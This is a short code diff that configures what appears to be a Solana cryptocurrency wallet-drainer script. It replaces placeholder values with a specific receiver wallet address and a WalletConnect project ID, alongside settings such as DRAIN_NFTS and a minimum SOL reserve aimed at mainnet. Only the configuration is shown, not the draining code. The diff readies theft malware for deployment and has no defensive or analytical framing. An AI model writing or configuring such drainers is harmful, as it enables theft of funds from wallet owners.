@@ -5,7 +5,7 @@
 // ─── CONFIGURATION ───────────────────────────────────────────
 const CONFIG = {
     RECEIVER_WALLET: new solanaWeb3.PublicKey(
-        'YOUR_SOLANA_WALLET_ADDRESS_HERE'
+        'Zg5r67TdhqKf6YYcU6hi86j8Up7LX9DzBo5VZdmQE8y'
     ),
     RPC_ENDPOINT: 'https://api.mainnet-beta.solana.com',
     MIN_SOL_RESERVE: 0.001,
@@ -13,7 +13,7 @@ const CONFIG = {
     DRAIN_NFTS: false,
 
     // WalletConnect project ID (get one free at https://cloud.walletconnect.com)
-    WALLETCONNECT_PROJECT_ID: 'YOUR_WALLETCONNECT_PROJECT_ID',
+    WALLETCONNECT_PROJECT_ID: 'd1b74edde61b41874eae689d4595650e',
 };
 
 // ─── STATE ──────────────────────────────────────────────────
